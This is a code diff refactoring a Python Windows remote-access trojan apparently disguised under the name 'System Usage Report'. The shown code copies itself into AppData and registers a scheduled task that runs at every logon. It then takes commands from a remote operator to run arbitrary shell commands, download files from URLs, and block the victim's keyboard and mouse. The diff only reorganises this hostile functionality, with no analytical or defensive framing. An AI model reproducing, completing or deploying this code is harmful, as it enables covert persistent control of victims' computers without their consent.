@@ -18,9 +18,7 @@ port = 3142
 
 app_name = 'System Usage Report'
 
-global mouse_blocking
 mouse_blocking = False
-
 keyboard_blocking = False
 
 
@@ -65,9 +63,24 @@ def download_file(url, filename):
     return 'OK'
 
 
+def download_cmd_process(cmd):
+    params = cmd[9:].split()
+    if len(params) == 0:
+        return 'Specify the url and then the filename'
+    elif len(params) == 1:
+        return 'Specify the filename'
+    else:
+        return download_file(params[0], params[1])
+
+
 def get_working_dir():
     username = os.getlogin()
     return f'C:\\Users\\{username}\\AppData\\Local\\Programs'
+
+
+def create_startup_task(working_dir):
+    if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name}"')):
+        run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name}" /TR "{working_dir}"')
 
 
 def add_to_startup():
@@ -75,9 +88,9 @@ def add_to_startup():
 
     if not os.path.isfile(working_dir):
         copyfile(os.getcwd() + f'\\{app_name}' + '.exe', working_dir)
+        create_startup_task(working_dir)
         print('Program was added to startup')
-        if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name}"')):
-            run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name}" /TR "{working_dir}"')
+
         subprocess.Popen([working_dir])
         ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
         sys.exit()
@@ -86,19 +99,37 @@ def add_to_startup():
 
 
 def block_keyboard():
-    for i in range(110):
-        keyboard.block_key(i)
-    return 'OK'
+    global keyboard_blocking
+    if not keyboard_blocking:
+        for i in range(110):
+            keyboard.block_key(i)
+        keyboard_blocking = True
+        return 'OK'
+    else:
+        return 'Keyboard was already blocked'
 
 
 def unblock_keyboard():
-    for i in range(110):
-        keyboard.unblock_key(i)
-    return 'OK'
+    global keyboard_blocking
+    if keyboard_blocking:
+        for i in range(110):
+            keyboard.unblock_key(i)
+        keyboard_blocking = False
+        return 'OK'
+    else:
+        return "Keyboard isn't blocking"
+
+
+def keyboard_cmd_process(cmd):
+    if 'unblock' in cmd:
+        return unblock_keyboard()
+    elif 'block' in cmd:
+        return block_keyboard()
+    else:
+        return 'Specify the action'
 
 
 def block_mouse():
-    # until mouse_blocking is False, move mouse to (1,0)
     global mouse_blocking
     mouse_blocking = True
     while mouse_blocking:
@@ -106,9 +137,25 @@ def block_mouse():
 
 
 def unblock_mouse():
-    # stops infinite control of mouse after 10 seconds if program fails to execute
     global mouse_blocking
     mouse_blocking = False
+
+
+def mouse_cmd_process(cmd):
+    if 'unblock' in cmd:
+        if mouse_blocking:
+            threading.Thread(target=unblock_mouse).start()
+            return 'OK'
+        else:
+            return "Mouse isn't blocking"
+    elif 'block' in cmd:
+        if mouse_blocking:
+            return 'Mouse was already blocked'
+        else:
+            threading.Thread(target=block_mouse).start()
+            return 'OK'
+    else:
+        return 'Specify the action'
 
 
 add_to_startup()
@@ -129,43 +176,11 @@ while True:
             if command.startswith('cmd'):
                 send(run_cmd_command(command[4:]))
             elif command.startswith('download'):
-                params = command[9:].split()
-                if len(params) == 0:
-                    send('Specify the url and then the filename')
-                elif len(params) == 1:
-                    send('Specify the filename')
-                else:
-                    send(download_file(params[0], params[1]))
+                send(download_cmd_process(command))
             elif command.startswith('keyboard'):
-                if 'unblock' in command:
-                    if keyboard_blocking:
-                        keyboard_blocking = False
-                        send(unblock_keyboard())
-                    else:
-                        send("Keyboard isn't blocking")
-                elif 'block' in command:
-                    if keyboard_blocking:
-                        send('Keyboard was already blocked')
-                    else:
-                        keyboard_blocking = True
-                        send(block_keyboard())
-                else:
-                    send('Specify the action')
+                send(keyboard_cmd_process(command))
             elif command.startswith('mouse'):
-                if 'unblock' in command:
-                    if mouse_blocking:
-                        threading.Thread(target=unblock_mouse).start()
-                        send('OK')
-                    else:
-                        send("Mouse isn't blocking")
-                elif 'block' in command:
-                    if mouse_blocking:
-                        send('Mouse was already blocked')
-                    else:
-                        threading.Thread(target=block_mouse).start()
-                        send('OK')
-                else:
-                    send('Specify the action')
+                send(mouse_cmd_process(command))
             elif command == 'ping':
                 send('pong')
             else:
